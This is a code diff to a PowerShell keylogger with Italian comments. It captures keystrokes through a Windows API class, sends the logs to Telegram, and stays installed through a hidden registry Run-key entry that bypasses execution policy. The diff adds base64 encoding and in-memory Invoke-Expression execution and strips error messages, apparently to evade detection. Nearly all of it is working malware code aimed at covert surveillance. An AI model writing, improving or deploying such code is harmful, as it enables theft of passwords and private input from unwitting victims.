@@ -12,7 +12,7 @@ if (-Not (Test-Path $tempFile)) {
 }
 
 # Funzione per catturare i tasti premuti
-function Start-Keylogger {
+$encodedKeylogger = {
     Add-Type @"
 using System;
 using System.Runtime.InteropServices;
@@ -36,21 +36,20 @@ public class KeyboardTracker {
 "@
 
     while ($true) {
-        Start-Sleep -Milliseconds 100  # Intervallo per ridurre l'uso della CPU
+        Start-Sleep -Milliseconds 100
         try {
             $keys = [KeyboardTracker]::LogKeys()
             if ($keys -ne "") {
                 Add-Content -Path $tempFile -Value $keys
             }
         } catch {
-            # Gestione errori silenziosa
             Start-Sleep -Seconds 5
         }
     }
-}
+} | Out-String | [System.Text.Encoding]::Unicode.GetBytes | [Convert]::ToBase64String
 
 # Funzione per inviare i log a Telegram
-function Send-Logs {
+$encodedSendLogs = {
     while ($true) {
         Start-Sleep -Seconds 30
         try {
@@ -66,18 +65,16 @@ function Send-Logs {
                 }
             }
         } catch {
-            # Gestione errori
-            Write-Host "Errore durante l'invio a Telegram: $_"
             Start-Sleep -Seconds 10
         }
     }
-}
+} | Out-String | [System.Text.Encoding]::Unicode.GetBytes | [Convert]::ToBase64String
 
-# Persistenza: aggiungi il keylogger al registro di avvio
+# Decodifica ed esegui in memoria
+Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedKeylogger)))
+Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedSendLogs)))
+
+# Persistenza: aggiungi al registro di avvio
 if (-Not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\Keylogger")) {
     New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Keylogger" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $PSCommandPath" | Out-Null
 }
-
-# Avvia il keylogger e l'invio dei log in background
-Start-Job -ScriptBlock { Start-Keylogger }
-Start-Job -ScriptBlock { Send-Logs }
